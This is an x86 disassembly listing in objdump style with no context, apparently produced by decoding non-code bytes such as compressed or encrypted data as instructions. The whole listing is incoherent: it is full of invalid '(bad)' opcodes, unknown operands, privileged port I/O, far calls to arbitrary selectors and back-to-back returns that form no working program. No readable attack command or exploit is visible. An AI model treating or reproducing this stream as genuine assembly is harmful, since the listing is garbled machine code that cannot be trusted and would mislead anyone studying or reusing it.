  411f30:	sbb    BYTE PTR [ebx-0x79],cl
  411f33:	inc    ebp
  411f34:	jg     0x411efd
  411f36:	out    dx,al
  411f37:	popa   
  411f38:	sub    DWORD PTR [edi+0x1f],0x47b0b5e7
  411f3f:	out    0xd7,eax
  411f41:	test   al,0x2a
  411f43:	mov    WORD PTR [eax-0x49],ss
  411f46:	pop    ss
  411f47:	aas    
  411f48:	lahf   
  411f49:	mov    al,0xbb
  411f4b:	ror    BYTE PTR [eax+0x6e],1
  411f4e:	xor    eax,0x2aa56de4
  411f53:	xchg   esi,eax
  411f54:	arpl   WORD PTR [edx+0x23],di
  411f57:	xchg   ebx,eax
  411f58:	(bad)  
  411f59:	leave  
  411f5a:	out    dx,eax
  411f5b:	dec    ebx
  411f5c:	aad    0xfc
  411f5e:	shr    DWORD PTR [ecx-0x175f3bea],1
  411f64:	fsub   DWORD PTR [ebx]
  411f66:	call   0x368825e2
  411f6b:	dec    ebp
  411f6c:	or     DWORD PTR [edi-0x7f],eax
  411f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f70:	sbb    bh,BYTE PTR [ebx+0x60a055d5]
  411f76:	sub    eax,0x264be988
  411f7b:	ins    DWORD PTR es:[edi],dx
  411f7c:	xlat   BYTE PTR ds:[ebx]
  411f7d:	inc    esp
  411f7e:	rcl    BYTE PTR [edi],0x53
  411f81:	std    
  411f82:	out    dx,eax
  411f83:	mov    cs,eax
  411f85:	xchg   ebp,eax
  411f86:	sub    al,0xad
  411f88:	push   esi
  411f89:	jecxz  0x411f9b
  411f8b:	pop    edi
  411f8c:	mov    bh,0x7f
  411f8e:	mul    eax
  411f90:	xor    bh,BYTE PTR [ebx+0xf913818]
  411f96:	pop    edi
  411f97:	mov    ch,0x8c
  411f99:	cs (bad) 
  411f9b:	iret   
  411f9c:	iret   
  411f9d:	mov    BYTE PTR [esi],0xff
  411fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fa1:	add    BYTE PTR [eax+esi*8+0x1d4dd262],dh
  411fa8:	sbb    DWORD PTR [esi+0x441d3cc1],esi
  411fae:	adc    DWORD PTR [ebp+ebx*4+0x17f94036],eax
  411fb5:	arpl   WORD PTR ds:0x5f30d6fa,bx
  411fbc:	mov    ch,0xa8
  411fbe:	xchg   edi,edx
  411fc0:	enter  0x8f87,0x97
  411fc4:	les    ecx,FWORD PTR [ecx+0x35b152c5]
  411fca:	add    eax,0xdad77f72
  411fcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fd0:	je     0x412027
  411fd2:	call   0x1ae5:0x87daa824
  411fd9:	loope  0x412041
  411fdb:	pusha  
  411fdc:	dec    ebx
  411fdd:	mov    cl,0x23
  411fdf:	lods   eax,DWORD PTR ds:[esi]
  411fe0:	test   DWORD PTR [ebx-0x63],edx
  411fe3:	sbb    BYTE PTR [esi+0x665d4b58],0x9b
  411fea:	add    eax,0xd76b93f7
  411fef:	pop    ebp
  411ff0:	xlat   BYTE PTR ds:[ebx]
  411ff1:	pop    ds
  411ff2:	jae    0x411f98
  411ff4:	sub    eax,0x752e772f
  411ff9:	mov    dh,0x5c
  411ffb:	cwde   
  411ffc:	inc    ebx
  411ffd:	loope  0x411fc6
  411fff:	fwait
  412000:	jb     0x411fe2
  412002:	push   ds
  412003:	(bad)  
  412004:	xchg   ebp,eax
  412005:	inc    ebx
  412006:	icebp  
  412007:	mov    al,0x5b
  412009:	sbb    eax,0xe1d076a8
  41200e:	sbb    edx,DWORD PTR ds:0xc47bc743
  412014:	and    al,0x96
  412016:	xor    ebp,esi
  412018:	dec    esp
  412019:	mov    dl,0xc3
  41201b:	ret    
  41201c:	ret    
  41201d:	push   edx
  41201e:	pop    esp
  41201f:	sbb    al,0xe4
  412021:	inc    ebp
  412022:	sbb    al,0xa9
  412024:	mov    WORD PTR [edi],es
  412026:	inc    ebp
  412027:	mov    WORD PTR [ecx-0x15],ds
  41202a:	adc    bl,BYTE PTR [edx-0x70]
  41202d:	loop   0x41207c
  41202f:	fnstcw WORD PTR [ecx]
  412031:	xchg   esi,eax
  412032:	push   eax
  412033:	mov    ds:0xdb8830d0,al
  412038:	retf   0xd88
  41203b:	call   0x87e2:0x755550f
  412042:	lods   eax,DWORD PTR ds:[esi]
  412043:	aam    0xcc
  412045:	lods   eax,DWORD PTR ds:[esi]
  412046:	sbb    dl,BYTE PTR [eax-0x6594312b]
  41204c:	sub    BYTE PTR [edx],al
  41204e:	mov    eax,ds:0x94b7418c
  412053:	mov    ds:0xd1662cb8,al
  412058:	add    eax,0x6039271f
  41205d:	retf   
  41205e:	sub    dh,ah
  412060:	cwde   
  412061:	xor    DWORD PTR [ecx-0x4ee51954],ecx
  412067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412068:	cdq    
  412069:	jo     0x412004
  41206b:	add    edi,DWORD PTR ds:0x43e7744a
  412071:	jo     0x412047
  412073:	lock sti 
  412075:	add    DWORD PTR [esp+ebp*8],0xffffffab
  412079:	enter  0x418c,0x10
  41207d:	fmulp  st(4),st
  41207f:	mov    dl,0x2e
  412081:	push   ebp
  412082:	and    BYTE PTR [esi+0x25],0x9c
  412086:	pop    ss
  412087:	hlt    
  412088:	jne    0x4120ee
  41208a:	mov    ebx,0x65e5eab6
  41208f:	lahf   
  412090:	dec    eax
  412091:	and    BYTE PTR ds:[esi-0x4643bcdd],0xda
  412099:	push   es
  41209a:	jp     0x41209e
  41209c:	sub    BYTE PTR [edi+ecx*4-0x2e],al
  4120a0:	pop    ds
  4120a1:	ja     0x4120cf
  4120a3:	fwait
  4120a4:	ret    0x2191
  4120a7:	repz jns 0x412084
  4120aa:	div    DWORD PTR [edx+0x9282600]
  4120b0:	test   DWORD PTR [ebx+0x1bbf1ba4],ecx
  4120b6:	in     eax,dx
  4120b7:	not    esp
  4120b9:	mov    al,0xf6
  4120bb:	xor    DWORD PTR [ebp+0x4a695c0a],esp
  4120c1:	pop    ebp
  4120c2:	cmp    al,0x55
  4120c4:	cmc    
  4120c5:	mov    ebx,0xc29c9fe
  4120ca:	pop    ecx
  4120cb:	push   esp
  4120cc:	xchg   ecx,eax
  4120cd:	mov    edx,0xeb2212a4
  4120d2:	lods   eax,DWORD PTR ds:[esi]
  4120d3:	ror    BYTE PTR [edi+0x73a1261c],1
  4120d9:	call   0xe83:0xe9e46dae
  4120e0:	xchg   ebp,eax
  4120e1:	sub    ebp,DWORD PTR [ecx]
  4120e3:	mov    al,ds:0x32aebcee
  4120e8:	je     0x4120ae
  4120ea:	sbb    esi,0x5
  4120ed:	fs jmp 0x41207e
  4120f0:	jmp    0x9cdeb7ec
  4120f5:	sahf   
  4120f6:	clc    
  4120f7:	or     ebx,DWORD PTR [edx-0x172a848]
  4120fd:	test   BYTE PTR [edx],cl
  4120ff:	mov    cl,0x57
  412101:	jmp    0xc216c786
  412106:	mov    ds:0xbcf4a806,eax
  41210b:	mov    ebp,0x8f60343f
  412110:	das    
  412111:	aas    
  412112:	addr16 jbe 0x412185
  412115:	push   ds
  412116:	fst    QWORD PTR [ecx+0x5e4e314e]
  41211c:	pop    ss
  41211d:	std    
  41211e:	enter  0x859e,0xa3
  412122:	adc    eax,0xcd9f5150
  412127:	xchg   esp,eax
  412128:	xor    cl,ch
  41212a:	adc    DWORD PTR [ecx-0x4],ebp
  41212d:	jle    0x4120cc
  41212f:	popa   
  412130:	stos   DWORD PTR es:[edi],eax
  412131:	add    ch,bl
  412133:	cdq    
  412134:	add    edx,DWORD PTR [edi+0x61]
  412137:	cdq    
  412138:	mov    ebx,0xef2e4275
  41213d:	fs xchg ch,al
  412140:	call   0x1954e87a
  412145:	cmc    
  412146:	popa   
  412147:	in     eax,dx
  412148:	pop    es
  412149:	cld    
  41214a:	jno    0x412171
  41214c:	lods   al,BYTE PTR ds:[esi]
  41214d:	sbb    ah,ch
  41214f:	mov    ch,dh
  412151:	jmp    0x41211c
  412153:	inc    ebx
  412154:	pop    esp
  412155:	or     BYTE PTR [ecx-0x3ae1185],dl
  41215b:	mov    ebp,0xb9e01766
  412160:	ins    DWORD PTR es:[edi],dx
  412161:	or     ebx,0xb2d38328
  412167:	sub    edx,esi
  412169:	dec    ecx
  41216a:	pop    edx
  41216b:	and    eax,0xceaa4751
  412170:	mov    WORD PTR [ecx+0x16],ss
  412173:	pusha  
  412174:	shl    BYTE PTR [ebp-0x3835160],1
  41217a:	add    DWORD PTR [edi-0x5],esp
  41217d:	outs   dx,DWORD PTR ds:[esi]
  41217e:	sahf   
  41217f:	dec    eax
  412180:	scas   al,BYTE PTR es:[edi]
  412181:	(bad)  
  412182:	out    dx,al
  412183:	imul   esi,DWORD PTR [ecx],0xf3d0b717
  412189:	shl    BYTE PTR [ebx],1
  41218b:	jg     0x4121a5
  41218d:	mov    al,0x90
  41218f:	jmp    0x68108eef
  412194:	int3   
  412195:	rcr    BYTE PTR [edi-0x2f7e9e9e],cl
  41219b:	in     al,dx
  41219c:	pop    esp
  41219d:	sbb    BYTE PTR [edi+0x5f416e03],bl
  4121a3:	sub    al,0x1
  4121a5:	sub    esi,edi
  4121a7:	push   ecx
  4121a8:	jmp    0x4121fc
  4121aa:	out    dx,al
  4121ab:	(bad)  
  4121ad:	loop   0x4121ee
  4121af:	ja     0x412226
  4121b1:	xchg   ebx,eax
  4121b2:	ret    
  4121b3:	mov    bh,BYTE PTR [edx]
  4121b5:	mov    ebx,ebp
  4121b7:	cvtpi2ps xmm4,QWORD PTR [ebp+0x5]
  4121bb:	xchg   esp,eax
  4121bc:	cmp    al,0x51
  4121be:	pop    ecx
  4121bf:	int3   
  4121c0:	aaa    
  4121c1:	or     edi,edx
  4121c3:	test   esp,ecx
  4121c5:	cmp    ah,BYTE PTR [edi+0x36c703f7]
  4121cb:	adc    eax,0x82fa21d4
  4121d0:	push   ebx
  4121d1:	nop
  4121d2:	jbe    0x412224
  4121d4:	adc    edx,edx
  4121d6:	test   BYTE PTR [ebp-0xc61f01a],ah
  4121dc:	nop
  4121dd:	lods   al,BYTE PTR ds:[esi]
  4121de:	mov    ds:0x9b3b9f6f,al
  4121e3:	push   ecx
  4121e4:	xchg   ecx,eax
  4121e5:	in     al,dx
  4121e6:	scas   al,BYTE PTR es:[edi]
  4121e7:	inc    esi
  4121e8:	leave  
  4121e9:	sub    al,0x46
  4121eb:	int    0x67
  4121ed:	inc    eax
  4121ee:	aad    0x6d
  4121f0:	leave  
  4121f1:	leave  
  4121f2:	pop    esp
  4121f3:	cmp    DWORD PTR [edi-0x12],ecx
  4121f6:	dec    esp
  4121f7:	push   edi
  4121f8:	dec    ebp
  4121f9:	push   0xffffffa1
  4121fb:	sbb    al,0x39
  4121fd:	ins    BYTE PTR es:[edi],dx
  4121fe:	jne    0x4121f7
  412200:	(bad)  
  412201:	pop    ecx
  412202:	in     al,dx
  412203:	mov    ebx,0xbaf520c1
  412208:	inc    esi
  412209:	jne    0x412240
  41220b:	and    BYTE PTR [ebp-0xce33b16],cl
  412211:	outs   dx,DWORD PTR ds:[esi]
  412212:	bound  edx,QWORD PTR [esi-0x44]
  412215:	push   edi
  412216:	bound  ebx,QWORD PTR [esi]
  412218:	inc    edi
  412219:	push   0x9d166fab
  41221e:	outs   dx,BYTE PTR ds:[esi]
  41221f:	(bad)  
  412220:	outs   dx,DWORD PTR ds:[esi]
  412221:	into   
  412222:	ret    
  412223:	fistp  DWORD PTR [esi]
  412225:	jne    0x412278
  412227:	sbb    DWORD PTR [edi-0x16],0xec3130a7
  41222e:	(bad)  
  41222f:	sub    al,0xf2
  412231:	ucomiss xmm4,DWORD PTR [edi-0x7c]
  412235:	adc    al,0x7b
  412237:	addr16 push edx
  412239:	aad    0x69
  41223b:	cmc    
  41223c:	ds lahf 
  41223e:	mov    WORD PTR cs:[edi+ebp*1],es
  412242:	call   FWORD PTR ds:0xe838982
  412248:	int3   
  412249:	call   0x756c9086
  41224e:	xlat   BYTE PTR ds:[ebx]
  41224f:	xor    DWORD PTR [edi-0x4d04700],ecx
  412255:	pop    edi
  412256:	dec    esp
  412257:	ret    0xd5b3
  41225a:	inc    ebx
  41225b:	adc    ebp,DWORD PTR [eax+0x690f4b7]
  412261:	arpl   WORD PTR [edx-0x79],sp
  412264:	loopne 0x4121f3
  412266:	mov    dl,0xda
  412268:	add    ah,BYTE PTR [edi+ebx*8-0x2e58c11b]
  41226f:	jge    0x412274
  412271:	push   ebp
  412272:	rcr    DWORD PTR [ebp+0x4c],1
  412275:	data16 (bad) 
  412277:	mov    es,esi
  412279:	mov    WORD PTR [edx-0x49],es
  41227c:	mov    ecx,0xd7d30e4c
  412281:	jb     0x412247
  412283:	xor    DWORD PTR [ebx-0x2d],edi
  412286:	mov    ecx,0x6462d73d
  41228b:	out    dx,eax
  41228c:	xlat   BYTE PTR ds:[ebx]
  41228d:	push   0x126b69f4
  412292:	adc    edi,DWORD PTR [ecx]
  412294:	fs scas eax,DWORD PTR es:[edi]
  412296:	out    dx,eax
  412297:	stc    
  412298:	push   ss
  412299:	scas   al,BYTE PTR es:[edi]
  41229a:	cmp    DWORD PTR [ecx],ecx
  41229c:	xchg   edx,eax
  41229d:	iret   
  41229e:	ja     0x4122d1
  4122a0:	or     al,0x7b
  4122a2:	cmp    DWORD PTR [eax+0x4845899f],ebx
  4122a8:	jo     0x41224d
  4122aa:	setp   BYTE PTR [edx-0x79]
  4122ae:	rcl    DWORD PTR [ebx-0x38bdba93],1
  4122b4:	adc    BYTE PTR [ecx],ah
  4122b6:	lock and BYTE PTR [ebx+eiz*2-0x63d88e04],0x8
  4122bf:	mov    esi,cs
  4122c1:	loop   0x412295
  4122c3:	mov    ds:0x146f21b0,al
  4122c8:	push   ecx
  4122c9:	sbb    dh,0xf3
  4122cc:	cli    
  4122cd:	aad    0xd8
  4122cf:	retf   
  4122d0:	mov    edx,0x4f37a45b
  4122d5:	jo     0x4122c7
  4122d7:	push   0x9bf444fb
  4122dc:	mov    ds:0x63d1ac18,al
  4122e1:	dec    eax
  4122e2:	out    0x94,al
  4122e4:	xchg   ebx,eax
  4122e5:	mov    ds:0xae710d21,al
  4122ea:	test   BYTE PTR [edi+0x5ff9a1f],ch
  4122f0:	xor    eax,DWORD PTR [eax-0x2a]
  4122f3:	and    al,0x7d
  4122f5:	arpl   WORD PTR [ebx-0x7132da70],ax
  4122fb:	cmp    edi,ecx
  4122fd:	(bad)  
  4122fe:	jl     0x412341
  412300:	in     eax,0xad
  412302:	(bad)  
  412303:	push   ss
  412304:	mov    ds:0x8d01d8b9,al
  412309:	cli    
  41230a:	test   al,0x80
  41230c:	xor    DWORD PTR [bp+si],ecx
  41230f:	loope  0x412384
  412311:	outs   dx,BYTE PTR ds:[esi]
  412312:	fst    QWORD PTR [ecx]
  412314:	mov    ah,0x38
  412316:	mov    ebp,0x8d5eb8ea
  41231b:	push   ebp
  41231c:	loop   0x41229f
  41231e:	sbb    al,0x8e
  412320:	mov    al,0xb5
  412322:	push   edx
  412323:	fisub  WORD PTR [ebx+edi*8]
  412326:	xchg   ebx,eax
  412327:	mov    ebp,0x5c09fcfe
  41232c:	(bad)  
  41232d:	sub    al,0x98
  41232f:	enter  0x7dcb,0xa3
  412333:	cwde   
  412334:	scas   al,BYTE PTR es:[edi]
  412335:	ret    
  412336:	(bad)  
  412337:	push   ds
  412338:	fldenv [edx+0x57]
  41233b:	mov    al,ds:0x9de4f425
  412340:	pop    eax
  412341:	inc    eax
  412342:	or     DWORD PTR [ebx-0x560f88fb],ecx
  412348:	shl    al,cl
  41234a:	and    eax,DWORD PTR [esi-0xe900b7f]
  412350:	(bad)  
  412351:	pop    ecx
  412352:	and    BYTE PTR [edi],0xea
  412355:	nop
  412356:	pop    ecx
  412357:	push   es
  412358:	inc    eax
  412359:	mov    WORD PTR [esi],es
  41235b:	cld    
  41235c:	and    BYTE PTR [edx-0x3a44921e],ch
  412362:	mov    BYTE PTR [ebp-0xc530962],dh
  412368:	sahf   
  412369:	imul   edx,DWORD PTR [edx],0xffffff97
  41236c:	mov    ah,0x8e
  41236e:	xchg   ebp,eax
  41236f:	mov    bh,bl
  412371:	cmp    al,BYTE PTR [ecx+edi*2-0x204213a2]
  412378:	dec    ecx
  412379:	push   0x4
  41237b:	mov    ecx,0x906b69a5
  412380:	mov    ch,0xc3
  412382:	aam    0xf4
  412384:	lds    ebp,FWORD PTR [ebp+0x52]
  412387:	pop    esp
  412388:	cli    
  412389:	ins    DWORD PTR es:[edi],dx
  41238a:	jmp    0xef38:0x7e6d
  412390:	cmp    al,0xa2
  412392:	pop    ss
  412393:	pop    ebp
  412394:	gs mov edx,ds
  412397:	mov    ch,0x6a
  412399:	or     al,0xe6
  41239b:	jg     0x4123e6
  41239d:	xchg   esp,eax
  41239e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41239f:	inc    edx
  4123a0:	push   edx
  4123a1:	sub    bl,BYTE PTR [edx+eiz*2]
  4123a4:	jmp    0x2709d222
  4123a9:	data16 and al,0xba
  4123ac:	jmp    0x4123e0
  4123ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123af:	pop    esp
  4123b0:	je     0x412422
  4123b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b3:	jmp    0xeb74:0xcb631839
  4123ba:	sbb    eax,0x333145ac
  4123bf:	lea    edi,[esi]
  4123c1:	bound  edx,QWORD PTR [ebx]
  4123c3:	das    
  4123c4:	das    
  4123c5:	ja     0x412413
  4123c7:	mov    WORD PTR [ecx],?
  4123c9:	mov    ebx,0xefdb6bc6
  4123ce:	and    DWORD PTR [ecx],edi
  4123d0:	lods   al,BYTE PTR ds:[esi]
  4123d1:	fmul   st(6),st
  4123d3:	stos   BYTE PTR es:[edi],al
  4123d4:	mov    cl,0xaf
  4123d6:	mov    edi,0xa65fe17
  4123db:	in     al,0xb6
  4123dd:	adc    edx,DWORD PTR [ebp-0x75]
  4123e0:	push   edx
  4123e1:	rcl    al,0xa0
  4123e4:	pop    edi
  4123e5:	repz (bad) 
  4123e8:	pop    ebp
  4123e9:	or     al,bh
  4123eb:	enter  0xcac2,0xbe
  4123ef:	or     esp,ecx
  4123f1:	or     edx,DWORD PTR [esi]
  4123f3:	inc    edi
  4123f4:	adc    al,0x53
  4123f6:	push   es
  4123f7:	pusha  
  4123f8:	mov    ah,0x21
  4123fa:	mov    esp,0xed6df0b6
  4123ff:	mov    ds:0xd5dcdbe2,al
  412404:	outs   dx,DWORD PTR ds:[si]
  412406:	pop    esp
  412407:	shl    BYTE PTR [esp+ebx*8],1
  41240a:	or     BYTE PTR [eax],bl
  41240c:	sbb    al,0xd0
  41240e:	cld    
  41240f:	mov    edx,0x649f75d8
  412414:	in     al,0xcc
  412416:	test   DWORD PTR [ecx+0x61],0xe024f80
  41241d:	js     0x4123ff
  41241f:	loopne 0x412480
  412421:	sbb    eax,0x58751ca2
  412426:	fild   WORD PTR [edx]
  412428:	mov    al,BYTE PTR [ecx+eiz*1+0x3ba783ef]
  41242f:	addr16 das 
  412431:	(bad)  
  412433:	ss clc 
  412435:	push   eax
  412436:	mov    ds:0xef9d1509,al
  41243b:	jmp    0x4dd33520
  412440:	cwde   
  412441:	aam    0xbf
  412443:	in     al,0x44
  412445:	(bad)  
  412446:	push   es
  412447:	and    ecx,DWORD PTR [esi-0x2b]
  41244a:	pop    ds
  41244b:	mov    al,0x50
  41244d:	or     esp,eax
  41244f:	and    al,0x72
  412451:	and    eax,0x7abcc5dc
  412456:	shl    BYTE PTR [ebx-0x2c1259fe],0x61
  41245d:	popf   
  41245e:	pop    ebp
  41245f:	int    0xc3
  412461:	clc    
  412462:	pop    ss
  412463:	jp     0x4124de
  412465:	xchg   DWORD PTR [ebx],esp
  412467:	or     DWORD PTR [edi-0x1aabb6ae],eax
  41246d:	sub    BYTE PTR [ebx*8-0x1bd74170],0x7
  412475:	dec    eax
  412476:	outs   dx,BYTE PTR ds:[esi]
  412477:	fbld   TBYTE PTR [eax-0x2]
  41247a:	popf   
  41247b:	fadd   QWORD PTR [edi+0x2dd22c15]
  412481:	into   
  412482:	sar    DWORD PTR [ecx-0x22cbd051],cl
  412488:	jb     0x41242c
  41248a:	hlt    
  41248b:	mov    ebx,0xc09cdca2
  412490:	sbb    ah,BYTE PTR [eax+0x20]
  412493:	cmp    eax,0x3585e93b
  412498:	xor    ebx,esi
  41249a:	out    0xe1,eax
  41249c:	sti    
  41249d:	imul   ebp,ebx,0xffffff8c
  4124a0:	adc    eax,0xed419fe4
  4124a5:	mov    ds:0xec3385f,al
  4124aa:	jnp    0x41245b
  4124ac:	into   
  4124ad:	add    BYTE PTR [esi],dl
  4124af:	sub    DWORD PTR [ebp-0x4de1fdbf],eax
  4124b5:	test   eax,0xd3b90d32
  4124ba:	jns    0x41248b
  4124bc:	push   0xefb21310
  4124c1:	xchg   ebp,eax
  4124c2:	push   ebx
  4124c3:	dec    esi
  4124c4:	fst    QWORD PTR [esi]
  4124c6:	mov    WORD PTR [ecx],gs
  4124c8:	repnz and al,0xd2
  4124cb:	adc    esp,esp
  4124cd:	jmp    0x7781e15e
  4124d2:	int3   
  4124d3:	or     ebx,0x4dd38bb3
  4124d9:	pop    es
  4124da:	xchg   esi,eax
  4124db:	into   
  4124dc:	test   al,0x4e
  4124de:	arpl   si,ax
  4124e0:	shl    DWORD PTR [ebx+esi*2+0x71c65a21],1
  4124e7:	es pop ss
  4124e9:	call   0x3c9c5ef9
  4124ee:	nop
  4124ef:	(bad)  
  4124f0:	and    al,0xaa
  4124f2:	sbb    eax,0xdb09e167
  4124f7:	jg     0x41254c
  4124f9:	retf   0xfc1f
  4124fc:	imul   ecx,DWORD PTR [esi+0x32e917a3],0x525afa9a
  412506:	mov    edi,?
  412508:	jbe    0x412547
  41250a:	adc    BYTE PTR [ecx+0x34786e4a],0xb7
  412511:	mov    al,ds:0xf23c38f3
  412516:	pop    esp
  412517:	mov    dh,0x90
  412519:	and    eax,DWORD PTR [edi+esi*2-0x17069686]
  412520:	int    0xb7
  412522:	enter  0x4113,0xb1
  412526:	xchg   ebx,eax
  412527:	mov    ebx,0xd92d4534
  41252c:	das    
  41252d:	mov    ah,0x3e
  41252f:	je     0x41252f
  412531:	ja     0x41258e
  412533:	into   
  412534:	stos   DWORD PTR es:[edi],eax
  412535:	jmp    0x4abd2b9a
  41253a:	call   0xa7f5:0xee5e760c
  412541:	gs sub al,0xfa
  412544:	fisttp WORD PTR [ecx-0x44a33fe3]
  41254a:	in     eax,0xfa
  41254c:	push   eax
  41254d:	repz jp 0x4124ed
  412550:	sub    al,0xce
  412552:	jmp    0x89ed:0xc6a1db43
  412559:	add    al,0x3
  41255b:	test   al,0x2
  41255d:	je     0x412589
  41255f:	mov    al,ds:0x2945f1ee
  412564:	pop    es
  412565:	push   ds
  412566:	retf   0xddc1
  412569:	xchg   ebp,eax
  41256a:	les    edi,FWORD PTR [esi+0x60]
  41256d:	cs xor al,ch
  412570:	mov    esp,0x62e781dc
  412575:	or     BYTE PTR [ecx+0x4],bh
  412578:	jmp    0x9a01:0xbfc1a94f
  41257f:	or     eax,0x4029d6f1
  412584:	repz out dx,al
  412586:	jecxz  0x412537
  412588:	mul    DWORD PTR [ebp+0x4e36a8f2]
  41258e:	inc    esi
  41258f:	cmc    
  412590:	pop    esi
  412591:	mov    al,ds:0x96976cdb
  412596:	(bad)  
  412597:	adc    eax,DWORD PTR [ebp-0x52]
  41259a:	sar    BYTE PTR es:0x631da70e,cl
  4125a1:	div    edx
  4125a3:	add    DWORD PTR [ecx],ecx
  4125a5:	fbld   TBYTE PTR [ebx]
  4125a7:	aaa    
  4125a8:	sub    eax,0x7495f088
  4125ad:	inc    edi
  4125ae:	dec    esp
  4125af:	jb     0x4125e9
  4125b1:	sub    DWORD PTR [esi+eiz*8-0x7f],0xffffffa0
  4125b6:	gs dec esp
  4125b8:	arpl   bp,si
  4125ba:	bound  ecx,QWORD PTR [ebp-0x1355ebc9]
  4125c0:	sub    BYTE PTR [ecx],0xd9
  4125c3:	and    cl,BYTE PTR [edi+0x632b252c]
  4125c9:	xchg   ecx,eax
  4125ca:	cmp    BYTE PTR [ecx-0x30],bl
  4125cd:	popf   
  4125ce:	fdiv   st(0),st
  4125d0:	xor    eax,0x48a29b6e
  4125d5:	mov    ?,WORD PTR [edx+ecx*4]
  4125d8:	adc    DWORD PTR [esi+ecx*1-0x36a61d63],edi
  4125df:	lds    esp,FWORD PTR [edi+edi*8]
  4125e2:	push   eax
  4125e3:	scas   eax,DWORD PTR es:[edi]
  4125e4:	mov    DWORD PTR [edi+0xc1b1ded],0x15fd3856
  4125ee:	repz dec edx
  4125f0:	bound  esp,QWORD PTR [eax-0x6d]
  4125f3:	jmp    0x8310:0xba7528c2
  4125fa:	(bad)  
  4125fb:	mov    DWORD PTR [esi],0x7a3d9003
  412601:	inc    ebx
  412602:	cli    
  412603:	xchg   edx,eax
  412604:	stc    
  412605:	adc    DWORD PTR [ecx-0x14],ebx
  412608:	xchg   edx,eax
  412609:	out    0xf4,al
  41260b:	or     esp,esp
  41260d:	or     eax,0xd9f910c7
  412612:	mov    ds:0x68f3bc58,al
  412617:	call   0xed57:0x739556c8
  41261e:	sbb    al,0x18
  412620:	push   edx
  412621:	xor    al,0x18
  412623:	mov    DWORD PTR [edi],ecx
  412625:	out    dx,al
  412626:	xchg   esi,eax
  412627:	jae    0x412665
  412629:	sbb    eax,0xcc53d1b7
  41262e:	cmp    eax,0xae04d127
  412633:	adc    eax,0x22c9db55
  412638:	dec    ebp
  412639:	enter  0xdb9,0xe8
  41263d:	xor    ebp,DWORD PTR [edi+ebp*4+0x6d7e8539]
  412644:	arpl   WORD PTR [edi-0xd],sp
  412647:	loopne 0x412699
  412649:	push   edx
  41264a:	sub    eax,0x70cd4086
  41264f:	sub    al,0xbf
  412651:	movdqa xmm2,XMMWORD PTR [eax]
  412655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412656:	popa   
  412657:	and    ch,BYTE PTR [edx-0x820143d]
  41265d:	out    dx,al
  41265e:	and    DWORD PTR [ecx],0x99458852
  412664:	mov    ah,bl
  412666:	cmp    al,0x57
  412668:	sub    al,0x16
  41266a:	(bad)  
  41266b:	xlat   BYTE PTR ds:[ebx]
  41266c:	jmp    0x4125f3
  41266e:	xchg   ebp,eax
  41266f:	fwait
  412670:	and    ax,0xa839
  412674:	add    edi,edx
  412676:	xchg   esi,eax
  412677:	mov    bh,0x7a
  412679:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41267b:	xor    al,0x30
  41267d:	in     al,dx
  41267e:	dec    esp
  41267f:	dec    ebx
  412680:	inc    edx
  412681:	inc    esi
  412682:	adc    DWORD PTR [esi+0x30f03e9a],esp
  412688:	adc    esi,DWORD PTR [edi]
  41268a:	out    0xa8,al
  41268c:	jnp    0x4126ad
  41268e:	pop    edx
  41268f:	leave  
  412690:	call   0xb5fe:0x4e964669
  412697:	pop    esi
  412698:	xor    eax,0x8bb1ec38
  41269d:	adc    cl,BYTE PTR ds:0xa2ef0539
  4126a3:	in     al,0x6d
  4126a5:	(bad)  
  4126a6:	out    dx,eax
  4126a7:	pop    DWORD PTR [eax]
  4126a9:	pop    ds
  4126aa:	shr    DWORD PTR [edx-0x6c],cl
  4126ad:	add    DWORD PTR [ecx],esp
  4126af:	adc    al,0x49
  4126b1:	(bad)  
  4126b2:	repz (bad) 
  4126b4:	(bad)  
  4126b5:	jl     0x41272c
  4126b7:	lods   eax,DWORD PTR ds:[esi]
  4126b8:	(bad)  
  4126b9:	mov    BYTE PTR [edx+ebx*2+0x2ca8818b],cl
  4126c0:	es inc ecx
  4126c3:	clc    
  4126c4:	inc    esp
  4126c5:	adc    eax,DWORD PTR [ecx]
  4126c7:	pop    bx
  4126c9:	ins    DWORD PTR es:[edi],dx
  4126ca:	int    0x8f
  4126cc:	ret    
  4126cd:	ficom  WORD PTR [eax-0x3700345c]
  4126d3:	mov    WORD PTR [edi],?
  4126d5:	pmuludq mm7,QWORD PTR [esi+0x59]
  4126d9:	push   ebx
  4126da:	push   0x45
  4126dc:	xchg   ebx,eax
  4126dd:	out    0x2a,eax
  4126df:	dec    esi
  4126e0:	call   0xbc3e9fa2
  4126e5:	(bad)  
  4126e6:	pop    esi
  4126e7:	mov    ah,0x1d
  4126e9:	call   DWORD PTR [esi+0x2fdc91d7]
  4126ef:	nop
  4126f0:	jne    0x4126d9
  4126f2:	sub    al,0x4
  4126f4:	(bad)  
  4126f5:	cmp    eax,0xc0855ad1
  4126fa:	xchg   esp,eax
  4126fb:	mov    ss,WORD PTR ds:0xaa2c2fd3
  412701:	shl    DWORD PTR [eax],0x80
  412704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412705:	mov    ss,edi
  412707:	dec    ebp
  412708:	xchg   edx,eax
  412709:	sti    
  41270a:	inc    edx
  41270b:	cmp    eax,ebx
  41270d:	xor    eax,0x6bb22d1b
  412712:	pop    esp
  412713:	jo     0x412768
  412715:	cs mov dh,0xbd
  412718:	dec    edi
  412719:	mov    ds:0x25df5ce3,al
  41271e:	ret    
  41271f:	mov    cs,WORD PTR [esi-0x67c9b107]
  412725:	gs stc 
  412727:	mov    dl,0x32
  412729:	scas   al,BYTE PTR es:[edi]
  41272a:	xchg   ebx,eax
  41272b:	xchg   esi,eax
  41272c:	add    al,0xa8
  41272e:	(bad)  
  41272f:	mov    eax,ds:0x8f0523c5
  412734:	or     DWORD PTR [edi+0x208d4def],edx
  41273a:	mov    dh,BYTE PTR [edi+0x1de43c20]
  412740:	into   
  412741:	jb     0x4127a0
  412743:	and    dl,ch
  412745:	mov    dl,dh
  412747:	lods   al,BYTE PTR ds:[esi]
